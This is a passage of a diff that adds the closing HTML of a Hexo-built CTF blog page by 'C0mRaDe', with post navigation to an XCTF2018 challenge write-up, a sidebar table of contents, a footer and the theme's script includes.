+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/05/XCTF2018-Final-bestphp/" rel="next" title="XCTF2018-Final_bestphp">
+                <i class="fa fa-chevron-left"></i> XCTF2018-Final_bestphp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/gabe-crow.jpg"
+                alt="C0mRaDe" />
+            
+              <p class="site-author-name" itemprop="name">C0mRaDe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分類</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">標籤</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题目介绍"><span class="nav-number">1.</span> <span class="nav-text">题目介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解题过程"><span class="nav-number">2.</span> <span class="nav-text">解题过程</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0mRaDe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
